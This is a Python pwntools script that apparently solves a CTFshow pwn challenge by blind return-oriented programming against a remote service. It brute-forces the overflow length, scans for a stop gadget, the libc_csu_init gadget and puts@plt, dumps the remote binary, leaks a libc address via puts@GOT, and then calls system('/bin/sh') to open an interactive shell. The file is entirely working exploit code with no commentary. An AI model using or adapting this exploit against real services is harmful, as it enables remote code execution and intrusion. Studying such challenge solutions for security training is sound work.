from pwn import *
from LibcSearcher import *

def connection():
    io = remote('pwn.challenge.ctf.show',28256)
    io.recvuntil('Do you know who is daniu?\n')
    return io

def try_onegadget(times):
    io = connection()
    addr = 0x10a2fc
    payload = b'a' * times + p64(addr)
    io.sendline(payload)
    io.interactive()

def get_buf_length():
    times = 1
    while 1:
        try:
            io = connection()
            payload = 'a' * times
            io.send(payload)
            data = io.recv()
            print(data)
            io.close()
            if b'No passwd,See you!' not in data:
                return times - 1
            else:
                times += 1
        except EOFError:
            times += 1

def get_stop_gadget(times):
    address = 0x400000
    while 1:
        try:
            io = connection()
            payload = b'a' * times + p64(address)
            io.send(payload)
            data = io.recv(timeout = 0.1)
            print(data)
            print(hex(address))
            io.close()
            if data.startswith(b'Welcome to CTFshow-PWN ! Do you know who is daniu?'):
                return address
            else:
                address+=1
        except EOFError:
            address += 1

def get_csu_gadget(times,stop):
    start = 0x400000
    end = 0x401000
    banner = b'Welcome to CTFshow-PWN ! Do you know who is daniu?'

    def check(payload):
        io = None
        try:
            io = connection()
            io.send(payload)
            data = io.recv(timeout = 0.2)
            print(data)
            return data is not None and banner in data
        except EOFError:
            return False
        except:
            return False
        finally:
            if io:
                io.close()

    add = start
    while add < end:
        print(hex(add))
        payload_ok = (
            b'a' * times +
            p64(add) +
            p64(0x1111111111111111) +
            p64(0x2222222222222222) +
            p64(0x3333333333333333) +
            p64(0x4444444444444444) +
            p64(0x5555555555555555) +
            p64(0x6666666666666666) +
            p64(stop)
        )

        if check(payload_ok):
            payload_less = (
                b'a' * times +
                p64(add) +
                p64(0x1111111111111111) +
                p64(0x2222222222222222) +
                p64(0x3333333333333333) +
                p64(0x4444444444444444) +
                p64(0x5555555555555555) +
                p64(stop) +
                p64(0)
            )

            payload_more = (
                b'a' * times +
                p64(add) +
                p64(0x1111111111111111) +
                p64(0x2222222222222222) +
                p64(0x3333333333333333) +
                p64(0x4444444444444444) +
                p64(0x5555555555555555) +
                p64(0x6666666666666666) +
                p64(0x7777777777777777) +
                p64(stop)
            )

            less_ok = check(payload_less)
            more_ok = check(payload_more)

            if not less_ok and not more_ok:
                return add

        add += 1

    return None

def get_puts(times,stop,gadget):
    add = 0x400000
    pop_rdi = gadget + 9
    while 1:
        io = connection()
        print(hex(add))
        payload = b'a' * times + p64(pop_rdi) + p64(0x400000) + p64(add) + p64(stop)
        try:
            io.send(payload)
            data = io.recv(timeout = 0.1)
            print(data)
            io.close()
            if data.startswith(b'\x7fELF'):
                return add
            else:
                add += 1
        except:
            print('wrong\nwrong\n')
            add += 1

def leak(times,stop,gadget,puts_plt):
    end = 0x401000
    add = 0x400000
    with open('pwn', 'wb') as file:
        while add < end :
            io = connection()
            payload = b'a' * times + p64(gadget + 9) + p64(add) +p64(puts_plt) + p64(stop)
            io.send(payload)
            data = io.recvuntil("Welcome to CTFshow-PWN", timeout=0.1, drop=True)
            io.close()
            print(hex(add))
            print(data)
            if data == b'\n':
                data = b'\x00'
            elif data.endswith(b'\n'):
                data = data[:-1]
            else:
                add += 1
            print(data)
            file.write(data)
            add += len(data)

def attack(times,gadget,stop,puts_plt,puts_got):
    poprdi = gadget + 9
    io = connection()
    payload = b'a' * times + p64(poprdi) + p64(puts_got) + p64(puts_plt) + p64(stop)
    io.sendline(payload)
    real_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
    libc = LibcSearcher('puts',real_addr)
    libc_base = real_addr - libc.dump('puts')
    system_addr = libc_base + libc.dump('system')
    bin_sh = libc_base + libc.dump('str_bin_sh')
    payload = b'a' * times + p64(poprdi) + p64(bin_sh) + p64(system_addr) +p64(stop)
    io.sendline(payload)
    io.interactive()

times = 72
stop_gadget_address = 0x400728
gadget_addr = 0x40083a
puts_pltaddr = 0x400545
puts_gotaddr = 0x602018
#leak(times,stop_gadget_address,gadget_addr,puts_pltaddr)
attack(times,gadget_addr,stop_gadget_address,puts_pltaddr,puts_gotaddr)
#times = get_buf_length()
#address = get_stop_gadget(times)
#address = get_csu_gadget(times,stop_gadget_address)
#address = get_puts(times,stop_gadget_address,gadget_addr)
#print(hex(address))
